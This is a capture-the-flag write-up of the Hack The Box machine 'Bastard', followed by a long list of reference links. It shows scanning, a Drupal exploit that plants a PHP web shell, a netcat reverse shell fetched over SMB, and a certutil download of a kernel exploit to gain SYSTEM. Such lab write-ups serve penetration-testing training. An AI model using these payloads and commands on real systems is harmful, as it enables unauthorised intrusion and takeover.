# Bastard 

**OS:** Windows

**Level:** Medium

**Links:** [1](https://www.hackthebox.com/machines/Bastard)  [2](https://app.hackthebox.com/machines/Bastard)

**Machine ip:** 10.10.10.9

![Bastard](https://github.com/h4md153v63n/CTFs/assets/5091265/84d54684-632c-4ac5-ac8e-146a4b2d7267)


# Sections
+ [Reconnaissance](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/44_Bastard.md#reconnaissance)
+ [Enumeration](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/44_Bastard.md#enumeration)
+ [Exploitation & Gaining Access](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/44_Bastard.md#exploitation--gaining-access)
+ [Privilege Escalation](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/44_Bastard.md#privilege-escalation)
+ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/44_Bastard.md#links)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.9 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.9 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3af46416-e08d-4b5c-bdfb-0d8a16c4e1fb)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c9205d7a-b825-43c2-b71b-15b0456a3bb3)


## Enumeration
Visit **http://10.10.10.9**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cf5880f4-a25e-4c05-9b77-86ee83268cc1)

Check **http://10.10.10.9/CHANGELOG.txt**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5163edd8-e04c-472a-bd4e-45e64c7c4083)

Also try to run **droopescan** to enumerate the Drupal site [1](https://0xdf.gitlab.io/2019/03/12/htb-bastard.html#drupal---tcp-80)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3dbaa18e-48c7-45c9-9a6a-e5f6a86d879c)


## Exploitation & Gaining Access

### Method 1: Drupal CVE:N/A [1](https://www.exploit-db.com/exploits/41564)

Run searchsploit:

```
searchsploit drupal 7.x

searchsploit -m 41564
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d11fa67b-28a5-4a61-a50f-57a97b5b080c)

Exploit CVE:N/A [1](https://www.exploit-db.com/exploits/41564):

```
gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.9/ -k -n -r -t 10 --exclude-length 1233
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0ccab42b-9061-43f5-9c20-7b7c06453c46)

Test **http://10.10.10.9/rest** on the browser or using **curl**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/575bf492-5f0d-4771-b1b2-9a4d444580b6)

`curl http://10.10.10.9/rest`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dcd60e3d-a566-4697-966d-4c8fbcad26b2)

Modify the below lines in the exploit code:

```
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'cmd.php',
    'data' => '<?php system($_GET["cmd"]); ?>'
];
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b01489e0-aa1c-4305-ae2f-d9ae3dbd4b2b)

Run the exploit: `php 41564.php`

In case of **PHP Fatal error:  Uncaught Error: Call to undefined function curl_init()** error, run `sudo apt install php-curl` to install **php-curl**:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/293cb05e-6870-46cc-812d-1185ac050fa2)

Rerun the exploit: `php 41564.php`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab1d4ce6-aee4-4848-ba58-e3312d37e1c2)

It creates 2 files: **session.json** and **user.json**. 

Execute **http://10.10.10.9/cmd.php?cmd=whoami%20/all**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/557645c5-3039-4d4c-ab37-c4e5a0a724b8)

```
# On the kali attack vm: Start smbserver to share a copy of nc.exe
smbserver.py win /usr/share/windows-binaries/

# On the kali attack vm: Start netcat listener
nc -lnvp 4444

# Trigger the netcat revershell on the browser:
http://10.10.10.9/cmd.php?cmd=\\10.10.14.24\win\nc.exe -e cmd.exe 10.10.14.24 4444
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dcb8eaec-0ef3-4de7-b6ac-29859f8eecd4)

Get the revershell, and read user flag:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/652b50a0-4934-4ecd-8c70-20636bc5ac0d)


### Method 2: Drupal Session Cookie Bypass and Code/Command Injection
Check the different solution [1](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/bastard-writeup-w-o-metasploit#id-03d0) [2](https://teckk2.github.io/writeup/2017/12/21/Bastard.html)


### Method 3: Drupalgeddon2 -> CVE-2018-7600 [1](https://www.exploit-db.com/exploits/44449)
Check the solution [1](https://0xdf.gitlab.io/2019/03/12/htb-bastard.html#drupalgeddon2) [2](https://www.hackingarticles.in/bastard-hackthebox-walkthrough/) [3](https://benheater.com/hackthebox-bastard/#service-enumeration) [4](https://ethicalhacs.com/bastard-hackthebox-walkthrough/)

Control the links [1](https://www.exploit-db.com/exploits/44449) [2](https://github.com/dreadlocked/Drupalgeddon2) [3](https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/#pu3blic-exploits)


### Method 4: Drupalgeddon3 -> CVE-2018-7602 [1](https://www.exploit-db.com/exploits/44542)
Check the solution [1](https://0xdf.gitlab.io/2019/03/12/htb-bastard.html#drupalgeddon3)


## Privilege Escalation

### Method 1: MS10-059
Run `systeminfo` command:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c0ed2707-e0cb-481d-b467-a6d5aaaf90df)

```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c0440563-e3a0-47c0-85c0-a1adb55d091a)

Run Windows Exploit Suggester:

```
# On the kali attack vm:
python2 windows-exploit-suggester.py --update

python2 windows-exploit-suggester.py --database 2024-04-14-mssb.xls --systeminfo systeminfo.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1c85b903-336c-44b0-8e07-07b9f66c9861)

There are many exploits for privilege escalation here, but for now try **MS10-059**.

Download exploit [1](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe) [2](https://github.com/ASR511-OO7/windows-kernel-exploits/tree/master/MS10-059), and transfer to the target victim, then prepare netcat listener, and run the **MS10-059.exe**:

```
# On the kali attack vm:
sudo python3 -m http.server 80

nc -lnvp 5555

# On the target machine:
certutil.exe -urlcache -split -f "http://10.10.14.24/MS10-059.exe" MS10-059.exe

MS10-059.exe 10.10.14.24 5555
```

Get the shell as **nt authority\system**, and read the root flag:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7d279287-cbd6-42b2-8a42-fa6be81d17b6)


### Method 2: ms16_014 - metasploit solution
Check the solution [1](https://ethicalhacs.com/bastard-hackthebox-walkthrough/)


### Method 3: Juicy Potato
Check the solution [1](https://www.hackingarticles.in/bastard-hackthebox-walkthrough/) [2](https://benheater.com/hackthebox-bastard/#privilege-escalation) [3](https://juggernaut-sec.com/hackthebox-bastard/) [4](https://ivanitlearning.wordpress.com/2020/09/21/hackthebox-bastard/) [5](https://www.jeroenvansaane.com/posts/htb/bastard/)

Check Windows Server 2008 R2 Enterprise [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise).

Check for more details [1](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/44_Bastard.md#juicy-potato) [2](https://c-cracks.tumblr.com/post/618402658690187265/htb-bastard).


### Method 4: [MS15-051](https://www.exploit-db.com/exploits/37049)
Check the solution [1](https://0xdf.gitlab.io/2019/03/12/htb-bastard.html#ms15-051) [2](https://blog.artis3nal.com/writeups/htb-bastard/) [3](https://pencer.io/ctf/ctf-htb-bastard/#privilege-escalation) [4](https://initinfosec.com/writeups/htb/2020/02/10/bastard-htb-writeup/)

**Alternatively**, check the different solutions [1](https://rizemon.github.io/posts/bastard-htb/) [2](https://www.puckiestyle.nl/htb-bastard/)

---

# Links

# References & Alternatives
+ https://vvmlist.github.io/#Bastard
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/bastard-writeup-w-o-metasploit
    + https://pencer.io/ctf/ctf-htb-bastard/#alternative-way-to-get-code-execution
    + https://teckk2.github.io/writeup/2017/12/21/Bastard.html
+ https://0xdf.gitlab.io/2019/03/12/htb-bastard.html
    + https://benheater.com/hackthebox-bastard/
+ https://medium.com/@siddharth.singhal1995/hackthebox-walkthrough-bastard-7-a56cfef566f4
    + https://medium.com/@toneemarqus/bastard-htb-manual-walkthrough-2023-oscp-journey-b47fc418f3d
    	+ https://pencer.io/ctf/ctf-htb-bastard/#alternative-ippsec-method
+ https://www.hackingarticles.in/bastard-hackthebox-walkthrough/
    + https://juggernaut-sec.com/hackthebox-bastard/
    + https://ivanitlearning.wordpress.com/2020/09/21/hackthebox-bastard/
    + https://www.jeroenvansaane.com/posts/htb/bastard/
    + https://c-cracks.tumblr.com/post/618402658690187265/htb-bastard
+ https://rizemon.github.io/posts/bastard-htb/
+ https://ethicalhacs.com/bastard-hackthebox-walkthrough/
+ https://github.com/AlexPerucchini/Hack-The-Box/blob/master/systems/bastard-htb.md
    + https://github.com/Bengman/CTF-writeups/blob/master/Hackthebox/bastard.md


## CVE Scripting
+ **Drupal:** CVE:N/A [1](https://www.exploit-db.com/exploits/41564)
+ **Drupalgeddon2 / CVE-2018-7600:**
    + https://www.exploit-db.com/exploits/44449
    + https://github.com/dreadlocked/Drupalgeddon2
    + https://github.com/pimps/CVE-2018-7600
    + https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/#pu3blic-exploits
+ **Drupalgeddon3 / CVE-2018-7602:**
    + https://www.exploit-db.com/exploits/44542
+ **MS10-059:**
    + https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe
    + https://github.com/ASR511-OO7/windows-kernel-exploits/tree/master/MS10-059
+ **MS15-051:**
    + https://www.exploit-db.com/exploits/37049


## Tools
+ **netcat:** https://eternallybored.org/misc/netcat/
+ **droopescan:**
    + https://github.com/SamJoan/droopescan
    + https://www.geeksforgeeks.org/droopescan-cms-based-web-applications-scanner/
    + https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal
+ **Windows Exploit Suggester:**
  + https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+ **local exploit suggester:** https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester/


## Technical Knowledge
+ **pentesting drupal:**
    + https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal


## Problems Solution
+ **PHP Fatal error:  Uncaught Error: Call to undefined function curl_init():** 
    + https://stackoverflow.com/questions/6382539/call-to-undefined-function-curl-init
    + https://www.cyberciti.biz/faq/php-fatal-error-call-to-undefined-function-curl_init-in-homehttpdaincludesfunctions-php1/
    + https://enginetemplates.com/call-to-undefined-function-curl_init/


## Juicy Potato - Rotten Potato
+ https://juggernaut-sec.com/seimpersonateprivilege/
+ https://github.com/ivanitlearning/Juicy-Potato-x86
	+ https://github.com/ivanitlearning/Juicy-Potato-x86/releases
	+ https://github.com/ohpe/juicy-potato/releases
	+ https://github.com/ohpe/juicy-potato/
+ **CLSID:**
	+ https://ohpe.it/juicy-potato/CLSID/
	+ https://github.com/ohpe/juicy-potato/tree/master/CLSID
+ https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
	+ https://ohpe.it/juicy-potato/
	+ https://ivanitlearning.wordpress.com/2019/07/20/potato-privilege-escalation-exploits-for-windows/
	+ https://rizemon.github.io/posts/devel-htb/
	+ https://yogeshwarram-g.gitbook.io/hackthebox/windows/devil#privilege-escalation


## For More
+ https://www.drupal.org/drupalorg/docs/apis/rest-and-other-apis
+ https://www.ambionics.io/blog/drupal-services-module-rce
+ https://en.wikipedia.org/wiki/Internet_Information_Services
+ https://hashcat.net/wiki/doku.php?id=example_hashes
+ https://www.techtarget.com/whatis/definition/Drupal
+ https://stackoverflow.com/questions/2887282/how-to-find-version-of-drupal-installed

